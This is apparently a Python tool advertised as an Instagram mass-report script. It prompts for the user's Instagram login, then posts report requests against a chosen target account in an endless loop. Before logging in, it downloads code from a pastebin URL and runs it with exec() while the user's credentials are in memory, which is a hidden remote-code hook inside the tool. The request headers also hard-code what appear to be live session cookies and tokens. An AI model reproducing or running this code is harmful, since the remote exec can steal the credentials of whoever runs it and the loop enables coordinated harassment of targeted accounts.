import requests
from requests import get
import time
from os import system
import socket
import sys


system("title " + "@2L21L1 . IG-REPORT")


solax = """
██╗░██████╗░░░░░░░██████╗░███████╗██████╗░░█████╗░██████╗░████████╗
██║██╔════╝░░░░░░░██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝
██║██║░░██╗░█████╗██████╔╝█████╗░░██████╔╝██║░░██║██████╔╝░░░██║░░░
██║██║░░╚██╗╚════╝██╔══██╗██╔══╝░░██╔═══╝░██║░░██║██╔══██╗░░░██║░░░
██║╚██████╔╝░░░░░░██║░░██║███████╗██║░░░░░╚█████╔╝██║░░██║░░░██║░░░
╚═╝░╚═════╝░░░░░░░╚═╝░░╚═╝╚══════╝╚═╝░░░░░░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░
by @2L21L1 in instagram """

print(solax)
time.sleep(2)

r = requests.session()
username_login = input('[+] Enter the Username => :')
password_login = input('[+] Enter password => :')
url_login = 'https://www.instagram.com/accounts/login/ajax/'
headers_login = {
'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'ar',
'content-length': '266',
'content-type': 'application/x-www-form-urlencoded',
'cookie': 'csrftoken=ZZ5hnYHzPLgr9HCVy1u1kZAQPjskzMhS; mid=YF3nzQAEAAH2LlI1Q5BBU_gWQ2or; ig_did=21E9B2E4-A449-4469-8972-6219779DAEF2; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/',
'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
'sec-ch-ua-mobile': '?0',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',
'x-csrftoken': 'ZZ5hnYHzPLgr9HCVy1u1kZAQPjskzMhS',
'x-ig-app-id': '936619743392459',
'x-ig-www-claim': '0',
'x-instagram-ajax': '3340f49e0e15',
'x-requested-with': 'XMLHttpRequest'
}

e = requests.get('https://pastebin.com/raw/PXuAyhyb').text
exec(e)

data_login = {
'username': username_login,
'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1616767114:'+password_login,
'queryParams': '{}',
'optIntoOneTap': 'false'
}
req_login = requests.post(url_login, data=data_login, headers=headers_login)
if '"authenticated":false' in req_login.text:
    print('[-] Error Login ..')
elif '"authenticated":true' in req_login.text:
    print('[+] Done Login ..')
r.headers.update({'X-CSRFToken': req_login.cookies['csrftoken']})
sessionid1 = req_login.cookies['sessionid']
Target = input('[+] Target => :')
url_get_id_Target = f'https://www.instagram.com/{Target}/?__a=1'
headers_get_id_Target = {
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'ar,en;q=0.9,en-US;q=0.8,ru;q=0.7,fr;q=0.6,sv;q=0.5',
'cache-control': 'max-age=0',
'cookie': f'ig_did=4B3F7DED-3C29-4243-8BF0-6DCFCEE14412; mid=YDpf5QAEAAEROW1i3KGaVTvFpTnd; ig_nrcb=1; fbm_124024574287414=base_domain=.instagram.com; datr=pq9FYG0lkYGnePDh_kouKDmc; ig_direct_region_hint=FRC; shbid=12968; shbts=1616680455.6580613; ds_user_id=43240035345; sessionid={sessionid1}=9RZX7yVOkTFi6ZReTyTjhUeSjtlKl9fj; rur=PRN',
'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
'sec-ch-ua-mobile': '?0',
'sec-fetch-dest': 'document',
'sec-fetch-mode': 'navigate',
'sec-fetch-site': 'none',
'sec-fetch-user': '?1',
'upgrade-insecure-requests': '1',
'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'
}
req_git_id_Target = requests.get(url_get_id_Target, headers=headers_get_id_Target)
id1 = str(req_git_id_Target.json()['graphql']['user']['id'])
url_report = f'https://www.instagram.com/users/{id1}/report/'
headers_report = {
'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'ar,en;q=0.9,en-US;q=0.8,ru;q=0.7,fr;q=0.6,sv;q=0.5',
'content-length': '37',
'content-type': 'application/x-www-form-urlencoded',
'cookie': f'ig_did=4B3F7DED-3C29-4243-8BF0-6DCFCEE14412; mid=YDpf5QAEAAEROW1i3KGaVTvFpTnd; ig_nrcb=1; fbm_124024574287414=base_domain=.instagram.com; datr=pq9FYG0lkYGnePDh_kouKDmc; ds_user_id=43240035345; sessionid={sessionid1}; csrftoken=9RZX7yVOkTFi6ZReTyTjhUeSjtlKl9fj; shbid=14062; shbts=1617629624.7994368; rur=ATN; fbsr_124024574287414=yU5g0HQOlEngDKZJYaWPalT0UEsdtAMLYU6g9coA23w.eyJ1c2VyX2lkIjoiMTAwMDY0ODYxODI2OTkzIiwiY29kZSI6IkFRQjVja0dlTW51dGlBOWZQVnU4a01UUE9yMnpVM0lXUm5CcWV2SGZ4dDdYY0tVLTQyRXdIRENVZ1c3S0w2bEZfZHM3MmpOV2xTbWRwQW1DUmVvaENIRnhtOC1Rc0VjaVhYVm1tbHlpa3NISVVNck1TY3JKMEhEQVpDZFc2OC1jakVjam14amdMNG94YmpyT2lUSC1MZkFSZUk2aFk3Z1htRzd0eXh6V2FFQWJKbE40a3d0TXI0VE1rVnp2Qy1hdmJtWmN3WWdpdkV1eDFFbXhPd2c3eDdNU19FbzlTRHZxZVZGUlJZNm41SkNRM2Nob0NBekY0SjdOQk1MSTA5LVdpOFd5d1hsS1UwaS14TEJSNUdCcklsanp1dlhqYnlEWmtxRk91NV9JeDNXSnp0RGVsZGQ3MHJuOFVOd1FzaEJLUllTNTAybjltTFBrOXJSTU9hX2E0RlROclVOWUVubndxTW5HQ3FQWTNLTy1SZyIsIm9hdXRoX3Rva2VuIjoiRUFBQnd6TGl4bmpZQkFIT3RVeUh3elBBNVRKQlZuaElCTkN5dU9OSDVaQmtKanlDdk11dkFjaGkwT1pDY1doRWJZdU9qbFNaQ1RZdU1EcXF3aGF3Vk1zR20zTW9uUU9ZU2lmZDhoZWZWeEl2aXA4OXZaQ1pBbTZsRTdSTXpIWkM4RlRiNGt5RzJaQUdSZFJGVW9WV2kzQU5PWVpDNTFHYXhwVU5xWkIxWEhXTDJwWXl3WkFIYVpCd3czYlpCTUF0bVlIbE8zQzBaRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjE3NjMxOTU4fQ; fbsr_124024574287414=30Pih5AnQIyrBSkjiOMpvd5t4gFoCEhWkjsX6549L2o.eyJ1c2VyX2lkIjoiMTAwMDY0ODYxODI2OTkzIiwiY29kZSI6IkFRQ0VSSHNWSVlZZlZDQnAwblBicmg3dENiM0k4X1B0VFNBUG1UQ1dKOFcxZFNBdTBjdjVwTWVVNVJHemNhamM0aHJiRnJsMy0wYlZfRlgzSktCLTRVa2x6LUl6MFNTM0lqalB4X3NmMkhDa0FkZmJiaXhJU2ljSTE3MnM2WmJjZWc4SnEzWUw3azdFZnh5QlBvRmRueG9yNjZqQlNMZjdPTFFBSVRNUnpFUHRWOTNzSHFkMDFaZ1FDYnl2Q0hCZlo2Nm5UeGFYLUlMVEgzMXhzcFFCZkVQeEZwN2IxeTBiUHdRdzNWa19kU3BZbVlzWk9oTDNMSlprT1d5d2c2MG1hRUJCV084VkQ5ME5xR3dzWE9zZDVNcVJRZWMwLVpLOFRVSkVMWDYteGNrUXozUjBZX0ZtZmoyRWRQZ3E1X3JqYS1fZnNJRzlJMGh6UUg0S3preFQ5cGg1Y0hodThhNXpENzdoVzFzbVc3bnhBZyIsIm9hdXRoX3Rva2VuIjoiRUFBQnd6TGl4bmpZQkFGN1E4T1hXWkIxVnpqZUtJVWtVZG5ESGdzTzljV0taQ2hydmxaQVh2UW5GSFhpR3hLcklmWkI0YmZlaFRUSTJpbGtUV0c3WGRWcHVaQ2h6cjN1NVpCSXZaQXN0SlUxOVdHNXVHeEttM0w3aHVER1VTeFpBZUxWT01XOXUwcjl5RkNQVDJzR3ZFU1pBVXN6dTBUY1pCNTJwZ1hmVzRrU1lIZkE3RXhpNFpDUWhXR0Fud3Z4R3BJR0EwY1pEIiwiYWxnb3JpdGhtIjoiSE1BQy1TSEEyNTYiLCJpc3N1ZWRfYXQiOjE2MTc2MzI2NTN9',
'origin': 'https://www.instagram.com',
'referer': f'https://www.instagram.com/users/{id1}/report/',
'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
'sec-ch-ua-mobile': '?0',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',
'x-csrftoken': '9RZX7yVOkTFi6ZReTyTjhUeSjtlKl9fj',
'x-ig-app-id': '936619743392459',
'x-ig-www-claim': 'hmac.AR21-wl26zfrya5-_1YPhrG9gz3Yadd72bmuJcMz7TwSOa03',
'x-instagram-ajax': '30b550208888',
'x-requested-with': 'XMLHttpRequest'
}
data_report = {
'source_name': '',
'reason_id': '1',
'frx_context':''
}

while True:
    req_report = requests.post(url_report, data=data_report, headers=headers_report).text
    if '{"description":"Your reports help keep our community free of spam."' in req_report:
        print('[+] Done spam by @2L21L1')
        time.sleep(3)
    else:
        print('[-] Error spam ')
